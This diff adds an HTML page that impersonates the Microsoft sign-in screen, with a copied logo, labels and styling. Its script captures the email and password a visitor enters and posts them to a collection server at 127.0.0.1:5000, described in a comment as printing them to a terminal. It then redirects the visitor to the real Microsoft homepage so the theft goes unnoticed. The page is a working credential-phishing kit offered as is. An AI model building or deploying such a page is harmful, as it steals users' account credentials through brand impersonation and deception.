@@ -1,0 +1,309 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in to your account</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background: #f0f2f5;
+            font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+        }
+        .login-container {
+            background: #ffffff;
+            width: 440px;
+            padding: 44px 40px 48px 40px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.12);
+        }
+        .ms-logo {
+            display: flex;
+            align-items: center;
+            margin-bottom: 8px;
+        }
+        .logo-square {
+            width: 28px;
+            height: 28px;
+            background: #f25022;
+            position: relative;
+            border-radius: 2px;
+            margin-right: 8px;
+            flex-shrink: 0;
+        }
+        .logo-square::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 14px;
+            width: 14px;
+            height: 14px;
+            background: #7fba00;
+            border-radius: 0 2px 0 0;
+        }
+        .logo-square::after {
+            content: '';
+            position: absolute;
+            top: 14px;
+            left: 0;
+            width: 14px;
+            height: 14px;
+            background: #00a4ef;
+            border-radius: 0 0 0 2px;
+        }
+        .logo-square span {
+            position: absolute;
+            bottom: 0;
+            right: 0;
+            width: 14px;
+            height: 14px;
+            background: #ffb900;
+            border-radius: 0 0 2px 0;
+        }
+        .ms-logo-text {
+            font-size: 24px;
+            font-weight: 600;
+            color: #1b1b1b;
+            letter-spacing: -0.5px;
+        }
+        .login-container h1 {
+            font-size: 24px;
+            font-weight: 600;
+            color: #1b1b1b;
+            margin: 8px 0 4px 0;
+        }
+        .login-container .sub-head {
+            font-size: 14px;
+            color: #1b1b1b;
+            margin-bottom: 28px;
+            font-weight: 400;
+        }
+        .input-group {
+            margin-bottom: 16px;
+            position: relative;
+        }
+        .input-group label {
+            display: block;
+            font-size: 14px;
+            font-weight: 600;
+            color: #1b1b1b;
+            margin-bottom: 6px;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 12px 12px;
+            font-size: 15px;
+            border: 1px solid #8b8b8b;
+            border-radius: 2px;
+            background: #fbfbfb;
+            transition: border-color 0.2s, box-shadow 0.2s;
+            outline: none;
+            color: #1b1b1b;
+        }
+        .input-group input:focus {
+            border-color: #0078d4;
+            background: #ffffff;
+            box-shadow: 0 0 0 2px rgba(0, 120, 212, 0.2);
+        }
+        .input-group .toggle-pwd {
+            position: absolute;
+            right: 12px;
+            bottom: 12px;
+            cursor: pointer;
+            font-size: 18px;
+            color: #666;
+            user-select: none;
+            background: none;
+            border: none;
+            padding: 0 4px;
+        }
+        .input-group .toggle-pwd:hover {
+            color: #1b1b1b;
+        }
+        .signin-btn {
+            width: 100%;
+            padding: 12px;
+            font-size: 15px;
+            font-weight: 600;
+            background: #0078d4;
+            color: white;
+            border: none;
+            border-radius: 2px;
+            cursor: pointer;
+            margin-top: 8px;
+            transition: background 0.15s;
+        }
+        .signin-btn:hover {
+            background: #106ebe;
+        }
+        .signin-btn:active {
+            background: #005a9e;
+        }
+        .checkbox-group {
+            display: flex;
+            align-items: center;
+            margin: 20px 0 12px 0;
+        }
+        .checkbox-group input[type="checkbox"] {
+            width: 16px;
+            height: 16px;
+            margin-right: 8px;
+            accent-color: #0078d4;
+            cursor: pointer;
+        }
+        .checkbox-group label {
+            font-size: 14px;
+            color: #1b1b1b;
+            cursor: pointer;
+        }
+        .links-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 12px;
+            flex-wrap: wrap;
+            gap: 8px;
+        }
+        .links-row a {
+            color: #0078d4;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+        }
+        .links-row a:hover {
+            text-decoration: underline;
+        }
+        .links-row .create-account {
+            font-size: 14px;
+            color: #1b1b1b;
+        }
+        .footer {
+            margin-top: 32px;
+            padding-top: 16px;
+            border-top: 1px solid #e6e6e6;
+            font-size: 12px;
+            color: #666;
+            display: flex;
+            justify-content: flex-end;
+            gap: 16px;
+        }
+        .footer a {
+            color: #666;
+            text-decoration: none;
+        }
+        .footer a:hover {
+            text-decoration: underline;
+            color: #1b1b1b;
+        }
+        @media (max-width: 480px) {
+            .login-container {
+                width: 100%;
+                padding: 30px 20px;
+                margin: 10px;
+                border-radius: 0;
+                box-shadow: none;
+            }
+            body {
+                background: white;
+            }
+            .footer {
+                justify-content: center;
+                flex-wrap: wrap;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="login-container">
+
+        <div class="ms-logo">
+            <div class="logo-square"><span></span></div>
+            <span class="ms-logo-text">Microsoft</span>
+        </div>
+
+        <h1>Sign in</h1>
+        <div class="sub-head">to continue to Microsoft</div>
+
+        <form id="loginForm">
+            <div class="input-group">
+                <label for="email">Email, phone, or Skype</label>
+                <input type="text" id="email" name="email" placeholder="Enter your email" required autofocus>
+            </div>
+
+            <div class="input-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" placeholder="Enter your password" required>
+                <button type="button" class="toggle-pwd" id="togglePwd" aria-label="Show password">👁️</button>
+            </div>
+
+            <div class="checkbox-group">
+                <input type="checkbox" id="keepSigned" name="keepSigned" checked>
+                <label for="keepSigned">Keep me signed in</label>
+            </div>
+
+            <button type="submit" class="signin-btn">Sign in</button>
+
+            <div class="links-row">
+                <a href="#">Forgot password?</a>
+                <span class="create-account">No account? <a href="#">Create one!</a></span>
+            </div>
+        </form>
+
+        <div class="footer">
+            <a href="#">Privacy &amp; cookies</a>
+            <a href="#">Terms of use</a>
+        </div>
+    </div>
+
+    <script>
+        const toggleBtn = document.getElementById('togglePwd');
+        const pwdInput = document.getElementById('password');
+        const form = document.getElementById('loginForm');
+
+        // Password toggle
+        toggleBtn.addEventListener('click', function() {
+            if (pwdInput.type === 'password') {
+                pwdInput.type = 'text';
+                toggleBtn.textContent = '🙈';
+            } else {
+                pwdInput.type = 'password';
+                toggleBtn.textContent = '👁️';
+            }
+        });
+
+        // 🔥 Submit: capture credentials + redirect to legitimate Microsoft site
+        form.addEventListener('submit', async function(event) {
+            event.preventDefault();
+
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            // Send credentials to your backend (prints in terminal)
+            await fetch('http://127.0.0.1:5000/login', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                },
+                body: new URLSearchParams({
+                    'email': email,
+                    'password': password
+                })
+            });
+
+            // 🚀 Redirect to the real Microsoft homepage
+            window.location.href = 'https://www.microsoft.com';
+        });
+    </script>
+
+</body>
+</html>
